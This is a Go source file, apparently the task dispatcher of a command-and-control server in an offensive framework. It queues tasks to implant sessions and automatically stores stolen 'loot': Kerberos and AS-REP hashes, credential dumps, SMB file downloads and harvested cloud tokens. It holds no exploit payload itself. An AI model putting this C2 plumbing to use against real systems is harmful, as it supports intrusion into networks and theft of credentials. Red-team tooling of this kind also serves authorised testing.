package tasks

import (
	"context"
	"fmt"
	"log"
	"time"

	"github.com/KKingZero/erebus-exploit-framwork/pkg/crypto"
	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"github.com/KKingZero/erebus-exploit-framwork/server/db"
	"github.com/KKingZero/erebus-exploit-framwork/server/sessions"
	"google.golang.org/protobuf/proto"
)

type EventCallback func(event *pb.Event)

type Dispatcher struct {
	sessions *sessions.Manager
	store    *db.Store
	pending  *PendingTasks
	onEvent  EventCallback
}

func NewDispatcher(sessMgr *sessions.Manager, store *db.Store, onEvent EventCallback) *Dispatcher {
	return &Dispatcher{
		sessions: sessMgr,
		store:    store,
		pending:  NewPendingTasks(),
		onEvent:  onEvent,
	}
}

// Dispatch creates a task and enqueues it for the session. If wait is true, blocks until result.
func (d *Dispatcher) Dispatch(ctx context.Context, sessionID string, taskType pb.TaskType, data []byte, timeoutMs int64, wait bool) (string, *pb.TaskResult, error) {
	sess, ok := d.sessions.Get(sessionID)
	if !ok {
		return "", nil, fmt.Errorf("session not found: %s", sessionID)
	}
	if !sess.IsAlive() {
		return "", nil, fmt.Errorf("session is dead: %s", sessionID)
	}

	taskID, err := crypto.RandomID(8)
	if err != nil {
		return "", nil, err
	}

	task := &pb.Task{
		TaskId:    taskID,
		ImplantId: sess.ImplantID,
		TaskType:  taskType,
		Data:      data,
		TimeoutMs: timeoutMs,
	}

	if d.store != nil {
		if err := d.store.CreateTask(&db.TaskRow{
			TaskID:    taskID,
			SessionID: sessionID,
			TaskType:  int32(taskType),
			Data:      data,
			TimeoutMs: timeoutMs,
			CreatedAt: time.Now(),
		}); err != nil {
			return "", nil, fmt.Errorf("persist task: %w", err)
		}
	}

	// Track operator-requested beacon interval so Register/Beacon can advertise it.
	if taskType == pb.TaskType_TASK_SLEEP && len(data) > 0 {
		var st pb.SleepTask
		if err := proto.Unmarshal(data, &st); err == nil && st.SleepMs > 0 {
			sess.SetCheckinMs(st.SleepMs)
		}
	}

	sess.EnqueueTask(task)

	if !wait {
		return taskID, nil, nil
	}

	waiter := d.pending.AddWaiter(taskID)
	timeout := time.Duration(timeoutMs) * time.Millisecond
	if timeout == 0 {
		timeout = 60 * time.Second
	}

	select {
	case result := <-waiter.C:
		return taskID, result, nil
	case <-time.After(timeout):
		d.pending.Remove(taskID)
		return taskID, nil, fmt.Errorf("task %s timed out", taskID)
	case <-ctx.Done():
		d.pending.Remove(taskID)
		return taskID, nil, ctx.Err()
	}
}

// HandleResultForSession processes a task result only if the task belongs to sessionID.
func (d *Dispatcher) HandleResultForSession(sessionID string, result *pb.TaskResult) {
	d.handleResult(sessionID, result)
}

func (d *Dispatcher) handleResult(sessionID string, result *pb.TaskResult) {
	if result == nil {
		return
	}
	log.Printf("[dispatcher] task %s result: success=%v", result.TaskId, result.Success)

	if d.store != nil {
		row, err := d.store.GetTask(result.TaskId)
		if err != nil || row == nil {
			log.Printf("[dispatcher] rejected result for unknown task %s", result.TaskId)
			return
		}
		if sessionID != "" && row.SessionID != sessionID {
			log.Printf("[dispatcher] rejected result for task %s from session %s (expected %s)", result.TaskId, sessionID, row.SessionID)
			return
		}
		if row.CompletedAt != nil {
			log.Printf("[dispatcher] rejected duplicate result for completed task %s", result.TaskId)
			return
		}
		if err := d.store.CompleteTask(result.TaskId, result.Success, result.Data, result.Error, result.ExecutionTimeMs); err != nil {
			log.Printf("[dispatcher] failed to complete task %s: %v", result.TaskId, err)
			return
		}
		if result.Success && len(result.Data) > 0 {
			d.maybeStoreLoot(row, result)
		}
	}

	d.pending.Resolve(result.TaskId, result)

	if d.onEvent != nil {
		d.onEvent(&pb.Event{
			Type:      pb.EventType_EVENT_TASK_RESULT,
			Timestamp: time.Now().Unix(),
			TaskId:    result.TaskId,
		})
	}
}

// maybeStoreLoot auto-archives high-value AD/cred task payloads for operator list_loot.
func (d *Dispatcher) maybeStoreLoot(row *db.TaskRow, result *pb.TaskResult) {
	if d.store == nil || row == nil || result == nil {
		return
	}
	lootType := ""
	switch pb.TaskType(row.TaskType) {
	case pb.TaskType_TASK_KERBEROAST:
		lootType = "kerberos_hash"
	case pb.TaskType_TASK_ASREPROAST:
		lootType = "asrep_hash"
	case pb.TaskType_TASK_LDAP_ENUM:
		lootType = "ldap_enum"
	case pb.TaskType_TASK_CREDS_DUMP:
		lootType = "creds"
	case pb.TaskType_TASK_MODULE:
		// Auto-loot SMB downloads and cloud harvest payloads.
		if smb := (&pb.SMBClientResult{}); proto.Unmarshal(result.Data, smb) == nil && len(smb.FileData) > 0 {
			lootType = "smb_file"
		} else if cloud := (&pb.CloudHarvestResult{}); proto.Unmarshal(result.Data, cloud) == nil &&
			(len(cloud.Tokens) > 0 || len(cloud.Credentials) > 0) {
			lootType = "cloud_creds"
		} else {
			return
		}
	default:
		return
	}
	id, err := crypto.RandomID(8)
	if err != nil {
		return
	}
	if err := d.store.CreateLoot(&db.LootRow{
		ID:        id,
		Type:      lootType,
		Source:    result.TaskId,
		SessionID: row.SessionID,
		Data:      result.Data,
		Tags:      "auto,task",
		CreatedAt: time.Now(),
	}); err != nil {
		log.Printf("[dispatcher] loot store failed task=%s: %v", result.TaskId, err)
	}
}

// GetResult retrieves a stored task result.
func (d *Dispatcher) GetResult(taskID string) (*pb.TaskResult, bool, error) {
	if d.store == nil {
		return nil, false, fmt.Errorf("no store configured")
	}
	row, err := d.store.GetTask(taskID)
	if err != nil {
		return nil, false, err
	}
	if row.CompletedAt == nil {
		return nil, true, nil // pending
	}
	success := false
	if row.Success != nil {
		success = *row.Success
	}
	return &pb.TaskResult{
		TaskId:          row.TaskID,
		Success:         success,
		Data:            row.ResultData,
		Error:           row.ResultError,
		ExecutionTimeMs: row.ExecutionTimeMs,
	}, false, nil
}
